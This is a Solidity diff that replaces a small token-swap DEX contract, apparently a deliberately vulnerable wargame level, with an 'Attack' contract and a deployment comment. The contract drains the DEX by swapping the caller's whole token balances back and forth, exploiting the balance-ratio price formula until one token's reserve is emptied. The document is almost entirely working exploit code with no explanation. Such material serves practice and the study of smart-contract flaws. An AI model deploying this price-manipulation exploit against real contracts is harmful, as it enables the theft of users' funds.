@@ -1,67 +1,47 @@
 //SPDX-License-Identifier: MIT
 pragma solidity ^0.8.0;
 
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/IERC20.sol";
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/token/ERC20/ERC20.sol";
-import "https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable.sol";
-
-contract Dex is Ownable {
-  address public token1;
-  address public token2;
-  constructor() {}
-
-  function setTokens(address _token1, address _token2) public onlyOwner {
-    token1 = _token1;
-    token2 = _token2;
-  }
-  
-  function addLiquidity(address token_address, uint amount) public onlyOwner {
-    IERC20(token_address).transferFrom(msg.sender, address(this), amount);
-  }
-  
-  function swap(address from, address to, uint amount) public {
-    require((from == token1 && to == token2) || (from == token2 && to == token1), "Invalid tokens");
-    require(IERC20(from).balanceOf(msg.sender) >= amount, "Not enough to swap");
-    uint swapAmount = getSwapPrice(from, to, amount);
-    IERC20(from).transferFrom(msg.sender, address(this), amount);
-    IERC20(to).approve(address(this), swapAmount);
-    IERC20(to).transferFrom(address(this), msg.sender, swapAmount);
-  }
-
-  function getSwapPrice(address from, address to, uint amount) public view returns(uint){
-    return((amount * IERC20(to).balanceOf(address(this)))/IERC20(from).balanceOf(address(this)));
-  }
-
-  function approve(address spender, uint amount) public {
-    SwappableToken(token1).approve(msg.sender, spender, amount);
-    SwappableToken(token2).approve(msg.sender, spender, amount);
-  }
-
-  function balanceOf(address token, address account) public view returns (uint){
-    return IERC20(token).balanceOf(account);
-  }
+interface IERC20 {
+    function transferFrom(address from, address to, uint256 amount) external;
+    function balanceOf(address account) external view returns (uint256);
+    function totalSupply() external view returns (uint256);
 }
 
-contract SwappableToken is ERC20 {
-  address private _dex;
-  constructor(address dexInstance, string memory name, string memory symbol, uint256 initialSupply) ERC20(name, symbol) {
-        _mint(msg.sender, initialSupply);
-        _dex = dexInstance;
-  }
-
-  function approve(address owner, address spender, uint256 amount) public {
-    require(owner != _dex, "InvalidApprover");
-    super._approve(owner, spender, amount);
-  }
+interface IDex {
+    function token1() external view returns (IERC20);
+    function token2() external view returns (IERC20);
+    function swap(IERC20 from, IERC20 to, uint256 amount) external;
+    function approve(address spender, uint256 amount) external;
+    function getSwapPrice(IERC20 from, IERC20 to, uint256 amount) external view returns (uint256);
 }
 
-abstract contract Token1 is ERC20 {
-  /*constructor() ERC20("Token1", "TKN1") {
-    _mint(msg.sender, 110);
-  }*/
-}
+/**
+ * @dev after deploying use `await contract.approve("Attack address", 10)`
+ */
+contract Attack {
+    IDex immutable dex;
 
-abstract contract Token2 is ERC20 {}
+    constructor(IDex _dex) payable {
+        dex = _dex;
+        _dex.approve(address(_dex), type(uint256).max);
+    }
+
+    function swap() external {
+        dex.token1().transferFrom(msg.sender, address(this), dex.token1().balanceOf(msg.sender));
+        dex.token2().transferFrom(msg.sender, address(this), dex.token2().balanceOf(msg.sender));
+
+        bool firstToken = true;
+        while (dex.getSwapPrice(dex.token2(), dex.token1(), dex.token2().balanceOf(address(this))) < dex.token1().totalSupply()) {
+            firstToken
+                ? dex.swap(dex.token1(), dex.token2(), dex.token1().balanceOf(address(this)))
+                : dex.swap(dex.token2(), dex.token1(), dex.token2().balanceOf(address(this)));
+
+            firstToken = !firstToken; 
+        }
+
+        dex.swap(dex.token2(), dex.token1(), dex.token2().balanceOf(address(dex)));
+    }
+}
 
 
 
